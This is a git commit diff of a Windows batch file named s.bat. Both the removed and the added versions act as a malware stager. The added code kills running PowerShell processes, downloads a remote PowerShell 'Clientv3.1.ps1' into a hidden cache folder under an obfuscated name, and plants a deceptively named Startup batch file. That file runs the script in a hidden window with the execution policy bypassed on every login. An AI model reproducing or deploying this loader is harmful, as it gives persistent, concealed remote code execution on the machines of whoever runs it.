e5091017a742eda8675a18472d4f73160a52eadb
Jh1sc <105714284+jh1sc@users.noreply.github.com>
2023-02-27 07:46:54 +0800

    Add files via upload

--- s.bat
+++ s.bat
@@ -1,19 +1,23 @@
 @echo off
-MODE CON COLS=132 LINES=50
-if exist %temp%\Gdrv127a (
-  echo Created
-) else (
-  echo Not Create
-  md %temp%\Gdrv127a
-)
-set "startup_dir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-copy "%~f0" "%startup_dir%"
-attrib +R +H "%startup_dir%"\%~nx0
 
-start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/jh1sc/Conex/main/C.ps1' -OutFile $env:temp\Gdrv127a\C.ps1; exit"
-powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%temp%\Gdrv127a\C.ps1"
+:: Set the URL, temporary folder name, and process name
+set url=https://raw.githubusercontent.com/jh1sc/Conex/main/Clientv3.1.ps1
+set tmpfolder=%appdata%\.cache
+set process=powershell.exe
 
+:: Check if any PowerShell processes are running and kill them
+tasklist /FI "IMAGENAME eq %process%" | find /i "%process%" > nul && taskkill /f /im "%process%"
 
+:: Create the temporary folder if it doesn't exist
+if not exist %tmpfolder% mkdir %tmpfolder%
 
+:: Download the file and save it in the temporary folder
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%tmpfolder%\0xP81s3_1.ps1')"
 
+:: Create the batch file in the startup directory to run the PowerShell script
+echo @echo off > "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
+echo start /b /min powershell -windowstyle hidden -executionpolicy bypass -file "%tmpfolder%\0xP81s3_1.ps1" >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
+echo exit 0 >> "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
 
+:: Run the batch file to execute the PowerShell script
+call "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\RtlAllocateHeap_0b1100110x1.bat"
